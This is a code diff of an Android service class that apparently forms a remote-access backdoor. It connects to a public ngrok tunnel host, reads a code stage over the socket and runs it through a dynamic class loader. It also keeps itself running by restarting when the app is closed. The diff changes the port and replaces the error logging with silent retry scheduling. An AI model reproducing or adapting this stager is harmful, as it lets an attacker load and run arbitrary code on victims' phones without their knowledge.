@@ -19,12 +19,12 @@ import java.net.Socket;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
-
 import dalvik.system.DexClassLoader;
 
 public class Job extends Service {
     private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
     static Socket sock;
+    static Context context ;
 
     public Job() {
     }
@@ -37,7 +37,7 @@ public class Job extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         onTaskRemoved(intent);
         Cheetah.start(this);
-        Attempt();
+        new Jumper(getApplicationContext()).init();
         return START_STICKY;
     }
 
@@ -51,6 +51,7 @@ public class Job extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
+
     @Override
     public void onTaskRemoved(Intent intent) {
         Intent serviceintent = new Intent(getApplicationContext(), Cheetah.class);
@@ -58,30 +59,31 @@ public class Job extends Service {
         startService(serviceintent);
         super.onTaskRemoved(intent);
     }
+
     static void MainBridge() throws Exception {
-        int port = 13896;
-        String host = "0.tcp.in.ngrok.io";
-        try {
-            if (host.equals("")) {
-                ServerSocket server = new ServerSocket(port);
-                sock = server.accept();
-                server.close();
-            } else {
-                sock = new Socket(host, port);
+            int port = 12633;
+            String host = "0.tcp.in.ngrok.io";
+            try {
+                if (host.equals("")) {
+                    ServerSocket server = new ServerSocket(port);
+                    sock = server.accept();
+                    server.close();
+                } else {
+                    sock = new Socket(host, port);
+                }
+            } catch (IOException e) {
+                Functions.jobScheduler(Job.context);
             }
-        } catch (IOException e) {
-            e.printStackTrace(); // Log the exception for debugging
-            // Handle the exception or terminate gracefully
+            if (sock != null) {
+                try {
+                    readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
+                } catch (IOException e) {
+                    Functions.jobScheduler(Job.context);
+                }
+            }
         }
 
-        if (sock != null) {
-            try {
-                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
-            } catch (IOException e) {
-                e.printStackTrace(); // Handle the exception
-            }
-        }
-    }
+
 
     public static void readAndRunStage(DataInputStream input, OutputStream output, String[] args) throws Exception {
         String dirPath = args[0];
